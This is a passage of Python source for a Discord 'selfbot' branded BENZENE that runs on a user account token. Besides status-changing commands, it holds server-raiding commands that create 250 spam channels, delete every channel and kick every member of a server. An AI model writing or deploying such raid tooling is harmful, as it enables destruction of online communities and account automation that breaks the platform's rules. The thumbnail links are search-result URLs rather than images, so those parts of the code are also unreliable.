    embed.set_thumbnail(url='https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM')
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(name='___**STATUS COMMANDS**___', value='```STATUS COMMADS ARE HERE lol xD```')
    embed.add_field(name='**LISTEN**', value='```THIS COMMAND SET YOUR STATUS TO LISTENING || ex - $listen BENZENE ON TOP```')
    embed.add_field(name='**WATCH**', value='```THIS COMMAND SET YOUR STATUS WATCHING || ex - $watch  BENZENE SELF BOT```')
    embed.add_field(name='**GAME**', value='```THIS COMMAND SET YOUR STATUS TO PLAYING || ex - $game BENZENE ?```')
    embed.add_field(name='**STREAM**', value='```THIS COMMAND SET YOUR STATUS TO STREAMING || ex - $stream SELFBOT CODED BY BENZENE```')
    
    await ctx.send(embed=embed) 
    

@client.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannel(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="TRASHED BY BENZENE")
        except:
            return
          
@client.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@client.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="BENZENE was here?")
        except:
            pass
          
        

    
@client.command()
async def embed(ctx, *, description):
    embed = discord.Embed(title='BENZENE SELFBOT', description=description)
    embed.set_footer(text='Created by BENZENE')
    embed.set_thumbnail(url="https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM")
    await ctx.send(embed=embed)

@client.command(aliases=['listening'])
async def listen(ctx, *, listenstatus="I didn't know how to specify a listen status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listenstatus))
    embed=discord.Embed(title="BENZENE SELFBOT - Listen Status", description=f"Status is now : `Listening to {listenstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM")
    embed.set_footer(text="Created by BENZENE")
    await ctx.message.edit(content="",embed=embed)

@client.command(aliases=['watching'])
async def watch(ctx, *, watchstatus ="I didn't know how to specify a watch status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watchstatus))    
    embed=discord.Embed(title="BENZENE SELF BOT- Watch Status", description=f"Status is now : `Watching {watchstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM")
    embed.set_footer(text="Created by BENZENE")
    await ctx.message.edit(content="",embed=embed)

@client.command(aliases=['gaming'])
async def game(ctx, *, gamestatus="I didn't know how to specify a game status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name=gamestatus))
    embed=discord.Embed(title="BENZENE Selfbot - Game Status", description=f"Status is now : `Playing {gamestatus}`", color=randcolor)
    embed.set_thumbnail(url="https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM")
    embed.set_footer(text="Created By BENZENE'")
    await ctx.send(content="",embed=embed)

@client.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if client.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(client.copycat))
    client.copycat = None
            
            
    
@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url='https://www.twitch.tv/discordtos',
    )
    await client.change_presence(activity=stream)
    
@client.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=discord.Status.dnd)

    
print(f'[SUCCESFULLY]  - Logged in as {client.user}.')

client.run(fuck, bot=False)

